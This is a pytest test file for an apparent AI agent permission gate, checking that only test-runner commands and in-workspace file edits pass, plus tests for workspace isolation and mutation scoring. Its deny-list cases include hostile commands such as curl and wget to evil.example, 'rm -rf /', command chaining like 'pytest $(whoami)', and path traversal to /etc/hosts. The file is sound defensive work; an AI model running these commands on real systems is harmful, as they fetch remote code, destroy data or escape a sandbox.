"""Agent-layer tests.

The permission gate is the security boundary, so it is tested directly and exhaustively
without any agent run: `allowed_tools` is only forwarded to the CLI, but `can_use_tool`
runs in this process and is what actually stops the agent reaching the network or git.
"""

from pathlib import Path

import pytest

from trustlayer.agent.runtime import DEFAULT_ALLOWED_TOOLS, AgentResult, ToolGate
from trustlayer.agent.workspace import diff_workspace, workspace


FIXTURES = Path(__file__).parent / "fixtures"


def gate(tmp_path=None):
    return ToolGate(DEFAULT_ALLOWED_TOOLS, workspace=tmp_path)


# ------------------------------------------------------- the gate: what it must allow


def test_the_test_runner_is_allowed_in_its_usual_forms():
    for command in (
        "pytest",
        "pytest -q",
        "pytest tests/",
        "pytest tests/test_pricing.py -q",
        "python -m pytest",
        "python3.12 -m pytest tests/",
        ".venv/bin/pytest -q",
        "/home/u/proj/.venv/bin/pytest tests/",
    ):
        assert gate().evaluate("Bash", {"command": command}) is None, command


def test_file_tools_are_allowed_inside_the_workspace(tmp_path):
    guard = gate(tmp_path)
    assert guard.evaluate("Read", {"file_path": str(tmp_path / "src" / "a.py")}) is None
    assert guard.evaluate("Write", {"file_path": "tests/test_new.py"}) is None
    assert guard.evaluate("Grep", {"pattern": "def "}) is None


# -------------------------------------------------------- the gate: what it must deny


@pytest.mark.parametrize(
    "command",
    [
        "git commit -m 'x'",
        "git push",
        "curl https://evil.example/sh",
        "wget http://evil.example",
        "pip install requests",
        "rm -rf /",
        "python -c 'import os; os.system(\"id\")'",
        "bash",
        "sh -c pytest",
    ],
)
def test_non_test_runner_commands_are_denied(command):
    denial = gate().evaluate("Bash", {"command": command})

    assert denial is not None, command
    assert denial.tool == "Bash"


@pytest.mark.parametrize(
    "command",
    [
        "pytest && git push",
        "pytest; curl evil.example",
        "pytest | tee /tmp/out",
        "pytest > /tmp/out",
        "pytest `git rev-parse HEAD`",
        "pytest $(whoami)",
        "pytest\ngit push",
        "pytest & git push",
    ],
)
def test_a_command_that_starts_with_pytest_but_chains_is_denied(command):
    """The dangerous shape: a legitimate prefix hiding a second command."""
    denial = gate().evaluate("Bash", {"command": command})

    assert denial is not None, command
    assert "chain" in denial.reason


@pytest.mark.parametrize("tool", ["WebFetch", "WebSearch", "web_search", "code_execution", "Task"])
def test_network_and_delegation_tools_are_denied_even_if_requested(tool):
    """ALWAYS_DENIED outranks the caller's allowlist."""
    permissive = ToolGate([*DEFAULT_ALLOWED_TOOLS, "WebFetch", "WebSearch", "Task"])

    denial = permissive.evaluate(tool, {})

    assert denial is not None
    assert "never permitted" in denial.reason


def test_a_tool_outside_the_allowlist_is_denied():
    denial = ToolGate(["Read"]).evaluate("Write", {"file_path": "x.py"})

    assert denial is not None
    assert "not in the allowed tool list" in denial.reason


def test_writes_outside_the_workspace_are_denied(tmp_path):
    guard = gate(tmp_path)

    escaped = guard.evaluate("Write", {"file_path": "/etc/passwd"})
    traversal = guard.evaluate("Edit", {"file_path": "../../../etc/hosts"})

    assert escaped is not None and "escapes the workspace" in escaped.reason
    assert traversal is not None and "escapes the workspace" in traversal.reason


def test_denials_are_recorded_for_the_report(tmp_path):
    guard = gate(tmp_path)
    guard.evaluate("Bash", {"command": "git push"})

    assert guard.denied == []  # evaluate() is pure; recording happens in __call__


@pytest.mark.anyio
async def test_calling_the_gate_records_the_denial_and_returns_deny(tmp_path):
    from claude_agent_sdk import PermissionResultDeny

    guard = gate(tmp_path)
    result = await guard("Bash", {"command": "git push"}, None)

    assert isinstance(result, PermissionResultDeny)
    assert len(guard.denied) == 1
    assert guard.denied[0].tool == "Bash"


@pytest.fixture
def anyio_backend():
    return "asyncio"


# ------------------------------------------------------------------------- workspace


def test_workspace_copies_the_repo_and_never_touches_the_original(tmp_path):
    origin = tmp_path / "repo"
    (origin / "src").mkdir(parents=True)
    (origin / "src" / "a.py").write_text("x = 1\n")
    (origin / ".git").mkdir()
    (origin / ".git" / "HEAD").write_text("ref: refs/heads/main\n")

    with workspace(origin) as space:
        assert (space.path / "src" / "a.py").read_text() == "x = 1\n"
        # .git is excluded, so the agent cannot commit even if it escapes the gate.
        assert not (space.path / ".git").exists()
        (space.path / "src" / "a.py").write_text("x = 2\n")
        assert diff_workspace(space)

    assert (origin / "src" / "a.py").read_text() == "x = 1\n"


def test_workspace_diff_reports_added_files(tmp_path):
    origin = tmp_path / "repo"
    origin.mkdir()
    (origin / "keep.py").write_text("a = 1\n")

    with workspace(origin) as space:
        (space.path / "test_new.py").write_text("def test_x():\n    assert True\n")
        diff = diff_workspace(space)

    assert "b/test_new.py" in diff
    assert "def test_x" in diff


def test_workspace_contains_rejects_paths_outside(tmp_path):
    origin = tmp_path / "repo"
    origin.mkdir()

    with workspace(origin) as space:
        assert space.contains(space.path / "a.py")
        assert not space.contains("/etc/passwd")


def test_workspace_rejects_a_non_directory(tmp_path):
    target = tmp_path / "file.txt"
    target.write_text("x")

    with pytest.raises(NotADirectoryError), workspace(target):
        pass


# --------------------------------------------------------------------- agent result


def test_agent_result_defaults_to_not_ok():
    """A result that was never populated must not read as success."""
    assert AgentResult(ok=False).ok is False
    assert AgentResult(ok=False).denied == []


# ------------------------------------------------- discard: failing tests are removed


def test_a_failing_generated_test_is_discarded_not_repaired(tmp_path):
    from trustlayer.agent.verify import count_tests, discard_failing_tests

    target = tmp_path / "test_generated.py"
    target.write_text(
        "def test_good():\n    assert 1 + 1 == 2\n\n\n"
        "def test_bad():\n    assert 1 + 1 == 3\n\n\n"
        "def test_also_good():\n    assert True\n"
    )

    removed = discard_failing_tests(target, {"test_bad"})

    assert removed == ["test_bad"]
    assert count_tests(target) == 2
    assert "test_bad" not in target.read_text()
    # The surviving tests are untouched, not rewritten.
    assert "test_good" in target.read_text()


def test_a_parametrized_failure_removes_the_whole_function(tmp_path):
    from trustlayer.agent.verify import discard_failing_tests

    target = tmp_path / "test_p.py"
    target.write_text("def test_x(v):\n    assert v\n\n\ndef test_keep():\n    assert True\n")

    removed = discard_failing_tests(target, {"test_x[case-2]"})

    assert removed == ["test_x"]
    assert "test_keep" in target.read_text()


def test_pytest_failure_lines_are_parsed(tmp_path):
    from trustlayer.agent.verify import FAILURE_RE

    line = "FAILED tests/test_pricing.py::test_discount - AssertionError: assert 0.15 == 0.1"
    match = FAILURE_RE.match(line)

    assert match and match.group("file") == "tests/test_pricing.py"
    assert match.group("test") == "test_discount"


def test_discard_survives_a_syntactically_broken_file(tmp_path):
    from trustlayer.agent.verify import discard_failing_tests

    target = tmp_path / "test_broken.py"
    target.write_text("def test_x(:\n  pass\n")

    assert discard_failing_tests(target, {"test_x"}) == []


# ----------------------------------------------------------- survivor spread + plateau


def test_survivors_are_taken_from_different_functions():
    from trustlayer.agent.harden import pick_survivors
    from trustlayer.mutation import Survivor

    survivors = [
        Survivor(f"pricing.x_apply_discount__mutmut_{n}", "src/pricing.py", n, "") for n in (1, 2, 3)
    ] + [
        Survivor("pricing.x_calculate_total__mutmut_1", "src/pricing.py", 9, ""),
        Survivor("pricing.x_round_money__mutmut_1", "src/pricing.py", 20, ""),
    ]

    chosen = pick_survivors(survivors)

    assert [s.function for s in chosen] == ["apply_discount", "calculate_total", "round_money"]


def test_pick_survivors_respects_the_limit():
    from trustlayer.agent.harden import pick_survivors
    from trustlayer.mutation import Survivor

    survivors = [Survivor(f"m.x_fn{n}__mutmut_1", "a.py", n, "") for n in range(10)]

    assert len(pick_survivors(survivors)) == 3


def test_survivor_exposes_its_function_from_the_mutant_id():
    from trustlayer.mutation import Survivor

    assert Survivor("pricing.x_apply_volume_discount__mutmut_3", "a.py", 1, "").function == (
        "apply_volume_discount"
    )


# --------------------------------------------------------------- mutation score maths


def test_mutation_score_counts_killed_and_survived():
    from trustlayer.mutation import _parse_counts, _score

    results = (
        "pricing.x_a__mutmut_1: killed\n"
        "pricing.x_a__mutmut_2: survived\n"
        "pricing.x_b__mutmut_1: killed\n"
        "pricing.x_b__mutmut_2: timeout\n"
        "pricing.x_c__mutmut_1: skipped"
    )

    killed, survived, total = _parse_counts(results)

    assert (killed, survived, total) == (3, 1, 5)  # timeout counts as killed
    assert _score(killed, survived) == 75.0


def test_score_is_zero_when_nothing_was_decided():
    from trustlayer.mutation import _score

    assert _score(0, 0) == 0.0
